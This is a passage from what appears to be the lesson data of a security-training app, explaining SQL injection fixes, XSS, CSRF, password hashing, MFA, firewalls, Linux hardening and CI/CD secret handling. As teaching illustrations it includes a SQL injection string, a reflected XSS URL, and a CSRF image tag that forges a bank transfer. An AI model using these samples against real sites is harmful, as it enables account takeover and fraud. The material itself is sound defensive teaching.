Why it works: even if the user types garry' OR '1'='1' --, the
database sees it as a literal username string, not SQL code.

OTHER FIXES:
• Use an ORM (Django, SQLAlchemy) — safe by default
• Least privilege: app DB user should only have SELECT/INSERT, not DROP
• WAF (Web Application Firewall) — blocks common SQLi patterns as backup`
      },
      {
        title: "XSS & CSRF",
        content: `WHAT IS XSS (Cross-Site Scripting)?
XSS is when an attacker injects JavaScript into a web page that other
users then load in their browser. The browser thinks it's legitimate
code from your site and runs it — with full access to that user's
session and cookies.

WHY DOES IT EXIST?
Browsers trust and execute any JavaScript that comes from a page.
If an attacker can get their JS into your page, the browser has no
way to know it wasn't supposed to be there.

TYPES:
Stored XSS   — attacker saves malicious script to your database
               (e.g. in a comment, profile bio, forum post)
               Every user who views that content runs the script.

Reflected XSS — script is in a URL parameter that gets echoed back
               Example: /search?q=<script>steal()</script>
               Attacker sends the victim this crafted link.

IMPACT: steal session cookies → log in AS the victim, keylog passwords,
redirect to phishing sites, deface the page.

FIX:
• Output encoding: before displaying user content in HTML, escape:
  < becomes &lt;   > becomes &gt;   " becomes &quot;
• React does this automatically (dangerouslySetInnerHTML is the danger!)
• Content Security Policy (CSP) header blocks inline scripts
• HttpOnly cookie flag: prevents JS from reading session cookies

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS CSRF (Cross-Site Request Forgery)?
CSRF tricks a logged-in user's browser into making a request to a site
they're authenticated on — without the user knowing or clicking anything.

HOW IT WORKS:
1. You log into bank.com — your browser stores a session cookie
2. You visit evil.com which contains a hidden image tag:
   <img src="https://bank.com/transfer?to=attacker&amount=5000">
3. Your browser automatically sends that request to bank.com
4. Since you're logged in, bank.com trusts it and transfers the money

The attacker never needed your password — just your active session.

FIX:
• CSRF token: server gives each form a secret random token.
  Request is only valid if it includes the right token.
  Attacker doesn't know the token → their request is rejected.
• SameSite=Strict cookie: browser won't send the cookie on
  cross-site requests at all. Simplest modern fix.
• Check Origin header: reject requests that didn't come from your domain.`
      },
      {
        title: "Authentication & Passwords",
        content: `WHAT IS AUTHENTICATION?
Authentication = proving who you are. It's the "logging in" part.
Authorization = what you're allowed to do once logged in.
People mix these up all the time — knowing the difference matters.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHY YOU CAN'T STORE PASSWORDS AS PLAIN TEXT:
If your database is ever leaked (and it happens), every user's
password is immediately exposed — and since people reuse passwords,
the attacker now has access to their email, bank, everything.

HOW PASSWORD HASHING WORKS:
Instead of storing the password, you store a "hash" — a scrambled
version that can't be reversed. When the user logs in, you hash what
they typed and compare it to the stored hash.

The key is using a SLOW hash function:
❌ MD5, SHA1 — designed to be fast. An attacker can try BILLIONS
   of passwords per second. Your entire database cracks in minutes.
✅ bcrypt — artificially slow. Takes ~100ms per hash. Attacker can
   only try ~10 passwords per second. 10 billion times harder to crack.
✅ Argon2 — even better, memory-hard (can't be sped up with GPUs)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MFA — MULTI-FACTOR AUTHENTICATION:
A password alone can be stolen (phishing, data breach, shoulder surfing).
MFA requires a second proof of identity:

Something you know  → password
Something you have  → phone with authenticator app, YubiKey hardware key
Something you are   → fingerprint, Face ID

TOTP (the 6-digit code in Google Authenticator):
• Your phone and the server share a secret key
• Both use: secret + current time → generate the same 6-digit code
• Code changes every 30 seconds
• Even if someone steals your password, they can't log in without
  the code from your phone

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SESSION COOKIES — THE RIGHT FLAGS:
After login, the server gives the browser a session cookie.
These flags protect it:

HttpOnly   — JavaScript CANNOT read this cookie.
             Prevents XSS from stealing it.
Secure     — Cookie only sent over HTTPS, never HTTP.
             Prevents interception on unsecured networks.
SameSite=Strict — Cookie not sent on requests from other sites.
             Prevents CSRF attacks.`
      },
      {
        title: "Network Security",
        content: `WHAT IS A FIREWALL?
A firewall is a gatekeeper that sits between your network and the
outside world. It inspects traffic and decides: let this through or block it.

Think of it like a bouncer at a club — they check every person
(packet) against a list of rules before letting them in.

TYPES — from simple to smart:

Packet Filter (Stateless)
  Looks at each packet in isolation: source IP, destination IP, port.
  Like a bouncer who only checks if your name is on a list.
  Fast but dumb — doesn't know if a packet is part of a real connection.
  Example: basic router ACLs, AWS NACLs

Stateful Firewall
  Tracks the full conversation (connection state).
  Knows if a packet is part of an established connection or suspicious.
  Like a bouncer who remembers you came in earlier and lets you back in.
  Example: AWS Security Groups, Windows Firewall, iptables

Application Firewall (Layer 7)
  Understands the actual content — HTTP requests, DNS queries, etc.
  Can block based on URLs, HTTP methods, payload content.

WAF (Web Application Firewall)
  Specialized for web traffic. Blocks SQLi, XSS, and other web attacks.
  Sits in front of your web server. Example: Cloudflare WAF, AWS WAF.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS TLS/HTTPS?
TLS (Transport Layer Security) encrypts data in transit so that
anyone intercepting the traffic sees gibberish instead of your data.

HTTP  = plain text. Anyone on the network can read it.
HTTPS = HTTP + TLS encryption. Traffic is encrypted end-to-end.

Without HTTPS, on public WiFi someone could see your passwords,
session cookies, and everything you submit to a website.

TLS versions:
• TLS 1.3 — current, fastest, most secure (2018+)
• TLS 1.2 — still acceptable
• TLS 1.0/1.1, SSLv3 — BROKEN, must be disabled

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS NETWORK SEGMENTATION?
Splitting a network into separate zones so that if one zone is
compromised, the attacker can't freely move to others.

Example zones:
• DMZ (public-facing) — web servers, load balancers
• Internal — app servers, databases (never reachable from internet)
• Management — SSH access, monitoring (restricted to VPN only)

Zero Trust: "never trust, always verify" — even traffic inside your
own network needs to authenticate. Don't assume internal = safe.`
      },
      {
        title: "Linux Hardening",
        content: `WHAT IS HARDENING?
Hardening means reducing the "attack surface" — the number of ways
an attacker could get in. A fresh server install has a lot of things
enabled by default that you probably don't need. Hardening turns off
what isn't needed and tightens what remains.

Think of it like: you moved into a new house (server). Hardening is
changing the locks, closing windows you don't use, and not leaving
a spare key under the doormat.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

KEEP EVERYTHING UPDATED:
Most real-world attacks exploit known vulnerabilities — ones that
already have patches available. Keeping packages updated closes
the majority of known attack vectors.

apt update && apt upgrade -y          Update all packages
# Enable automatic security updates:
apt install unattended-upgrades

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SSH HARDENING:
SSH is the main way into your server. If it's misconfigured,
it's the main way an attacker gets in too.

Edit /etc/ssh/sshd_config:
PermitRootLogin no         Root is the most powerful account.
                           Never let anyone SSH directly as root.
PasswordAuthentication no  Password = guessable, phishable, brutable.
                           SSH keys = cryptographic, much harder to steal.
AllowUsers garry deploy    Whitelist — only these users can SSH at all.
MaxAuthTries 3             After 3 wrong attempts, connection closes.

Why disable password auth?
Attackers run bots that constantly try common passwords against port 22.
With key-based auth, even a correct password gets rejected.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

UFW FIREWALL — DEFAULT DENY:
The safest firewall rule: block everything, then only open what you need.

ufw default deny incoming     Block all inbound by default
ufw default allow outgoing    Allow all outbound (your server can reach out)
ufw allow 22/tcp              Allow SSH
ufw allow 443/tcp             Allow HTTPS
ufw enable                    Turn it on

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FAIL2BAN — AUTOMATIC ATTACK BLOCKING:
Fail2ban watches log files for repeated failures and automatically
bans the offending IP address for a set amount of time.

Without it: attacker can try millions of SSH passwords forever.
With it: after 3 failures → IP banned for 1 hour.

apt install fail2ban
# /etc/fail2ban/jail.local:
[sshd]
enabled  = true
maxretry = 3        # bans after 3 failed attempts
bantime  = 3600     # banned for 1 hour (3600 seconds)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SUID FILES — A PRIVILEGE ESCALATION RISK:
SUID (Set User ID) is a file permission that lets a file run AS its
owner regardless of who executes it. If a SUID file owned by root
has a vulnerability, any user can exploit it to get root access.

find / -perm -4000 2>/dev/null    Find all SUID files on the system
# Investigate any unexpected ones — legitimate SUID files are few`
      },
      {
        title: "Security in CI/CD & Cloud",
        content: `WHY CI/CD SECURITY MATTERS:
Your CI/CD pipeline has elevated access — it builds, pushes images,
and deploys to production. If an attacker compromises your pipeline,
they can push malicious code straight to prod without anyone noticing.
The pipeline is a high-value target.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SECRETS — THE #1 MISTAKE:
A "secret" is anything that grants access: passwords, API keys,
database connection strings, private keys, tokens.

The most common mistake: committing secrets to Git.
Once in Git history, a secret is considered permanently compromised —
even if you delete it later. Git history is forever.

Real incident: developer pushes AWS keys to a public GitHub repo.
Within minutes, automated bots find it and start spinning up
hundreds of servers for crypto mining. Bill: $50,000.

❌ Never do this:
  DB_PASSWORD="mysecret123"  # in your code
  ENV DB_PASSWORD=mysecret   # in your Dockerfile

✅ Do this instead:
  • Store in GitHub Secrets → reference as \${{ secrets.DB_PASSWORD }}
  • Use AWS Secrets Manager / GCP Secret Manager at runtime
  • Inject via environment variables, never baked into the image

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DEPENDENCY VULNERABILITIES:
Your app uses dozens/hundreds of third-party libraries. Any one of
them could have a known vulnerability (CVE).

Log4Shell (2021): A bug in Log4j, a Java logging library. Attacker
sends a crafted string in ANY log message and gets remote code
execution on your server. It affected millions of apps worldwide.

How to protect yourself:
npm audit                    Scan Node.js dependencies
pip-audit                    Scan Python dependencies
trivy image myapp:latest     Scan Docker image for vulnerabilities
snyk test                    Multi-language, integrates into CI

Run these in your CI pipeline so every pull request is scanned.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CONTAINER SECURITY:
Containers run as root by default — if an attacker escapes the
container, they have root on the host. Always run as a non-root user:

# In Dockerfile:
RUN adduser --disabled-password --gecos '' appuser
USER appuser    # all subsequent commands + runtime run as appuser

Other container rules:
• Use minimal base images (alpine, distroless) — fewer packages = fewer vulnerabilities
• Never use --privileged flag in production
• Scan images before pushing to registry

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SHIFT LEFT — CATCH BUGS EARLY:
"Shift left" means moving security checks earlier in the development
process. Fixing a bug in development costs much less than fixing a
breach in production.

SAST (Static Analysis) — scans your source code without running it:
  SonarQube, Semgrep, CodeQL (GitHub)
  Catches: hardcoded secrets, SQL injection patterns, insecure functions

DAST (Dynamic Analysis) — tests your running application:
  OWASP ZAP — fires real HTTP attacks at your app
  Catches: runtime vulnerabilities, misconfigurations

Secret scanning — scans commits for leaked credentials:
  GitHub secret scanning (built-in, free)
  truffleHog, git-secrets`
      },
    ]
  },
];
